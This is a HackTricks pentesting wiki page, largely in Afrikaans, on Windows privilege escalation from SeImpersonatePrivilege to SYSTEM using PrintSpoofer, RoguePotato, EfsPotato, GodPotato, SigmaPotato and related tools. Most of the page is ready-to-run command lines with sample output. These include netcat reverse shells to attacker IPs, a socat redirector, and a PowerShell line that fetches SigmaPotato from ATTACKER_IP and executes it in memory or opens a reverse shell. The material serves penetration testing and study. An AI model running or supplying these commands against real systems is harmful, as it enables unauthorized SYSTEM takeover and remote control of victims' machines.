# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato werk nie** op Windows Server 2019 en Windows 10 build 1809 en later nie. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. Hierdie [blogpos](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) gaan in diepte oor die `PrintSpoofer` tool, wat gebruik kan word om impersonation privileges op Windows 10 en Server 2019 gashere te misbruik waar JuicyPotato nie meer werk nie.

> [!TIP]
> A modern alternative frequently maintained in 2024–2025 is SigmaPotato (a fork of GodPotato) which adds in-memory/.NET reflection usage and extended OS support. Sien vinnige gebruik hieronder en die repo in References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Vereistes en algemene struikelblokke

Al die volgende tegnieke berus op die misbruik van an impersonation-capable privileged service vanaf 'n konteks wat een van hierdie voorregte het:

- SeImpersonatePrivilege (mees algemeen) of SeAssignPrimaryTokenPrivilege
- Hoë integriteit is nie nodig as die token reeds SeImpersonatePrivilege het nie (tipies vir baie diensrekeninge soos IIS AppPool, MSSQL, ens.)

Kontroleer voorregte vinnig:
```cmd
whoami /priv | findstr /i impersonate
```
Operasionele notas:

- As jou shell onder 'n beperkte token loop wat nie SeImpersonatePrivilege het nie (algemeen vir Local Service/Network Service in sekere kontekste), herwin die rekening se standaardprivileges met FullPowers, en voer dan 'n Potato uit. Voorbeeld: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer benodig die Print Spooler-diens wat loop en bereikbaar is oor die plaaslike RPC-endpunt (spoolss). In geharde omgewings waar Spooler na PrintNightmare uitgeschakel is, verkies RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato benodig 'n OXID resolver bereikbaar op TCP/135. If egress is blocked, gebruik 'n redirector/port-forwarder (sien voorbeeld hieronder). Ouer builds het die -f vlag benodig.
- EfsPotato/SharpEfsPotato misbruik MS-EFSR; as een pipe geblokkeer is, probeer alternatiewe pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Fout 0x6d3 tydens RpcBindingSetAuthInfo dui gewoonlik op 'n onbekende/nie-ondersteunde RPC-authentikasiediens; probeer 'n ander pipe/transport of verseker dat die teiken-diens loop.

## Vinnige Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Aantekeninge:
- Jy kan -i gebruik om 'n interaktiewe proses in die huidige konsole te spawn, of -c om 'n eenreël-opdrag uit te voer.
- Vereis Spooler service. As dit gedeaktiveer is, sal dit misluk.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
As uitgaande poort 135 geblokkeer is, pivot die OXID resolver via socat op jou redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato is 'n nuwer COM-misbruik-primitive wat einde 2022 vrygestel is en die **PrintNotify** diens teiken in plaas van Spooler/BITS. Die binêre instantieer die PrintNotify COM-bediener, vervang 'n vals `IUnknown`, en aktiveer dan 'n bevoegde callback deur `CreatePointerMoniker`. Wanneer die PrintNotify-diens (wat as **SYSTEM** loop) terug koppel, dupliseer die proses die teruggegewe token en spawn die voorsiende payload met volle voorregte.

Key operational notes:

* Werk op Windows 10/11 en Windows Server 2012–2022 solank die Print Workflow/PrintNotify-diens geïnstalleer is (dit is teenwoordig selfs wanneer die klassieke Spooler na PrintNightmare gedeaktiveer is).
* Vereis dat die roepkonteks **SeImpersonatePrivilege** besit (tipies vir IIS APPPOOL, MSSQL, en scheduled-task service accounts).
* Aanvaar óf 'n direkte opdrag óf 'n interaktiewe modus sodat jy binne die oorspronklike konsole kan bly. Voorbeeld:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Aangesien dit suiwer COM-gebaseerd is, is geen named-pipe listeners of eksterne redirectors nodig nie, wat dit 'n drop-in vervanging maak op gasheer waar Defender RoguePotato’s RPC binding blokkeer.

Operateurs soos Ink Dragon vuur PrintNotifyPotato onmiddellik uit nadat hulle ViewState RCE op SharePoint verkry het om van die `w3wp.exe` worker na SYSTEM te pivot voordat hulle ShadowPad installeer.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Wenk: As een pipe misluk of EDR dit blokkeer, probeer die ander ondersteunde pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Nota:
- Werk op Windows 8/8.1–11 en Server 2012–2022 wanneer SeImpersonatePrivilege aanwesig is.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato bied twee variante wat diens-DCOM-objekte teiken wat standaard ingestel is op RPC_C_IMP_LEVEL_IMPERSONATE. Bou of gebruik die voorsiene binaries en voer jou kommando uit:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (opgedateerde GodPotato fork)

SigmaPotato voeg moderne geriewe by soos uitvoering in geheue deur middel van .NET reflection en 'n PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Verwysings

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Herstel standaard token-bevoegdhede vir diensrekeninge](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Onthulling van die relay-netwerk en die binneste werkinge van 'n sluipende offensiewe operasie](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
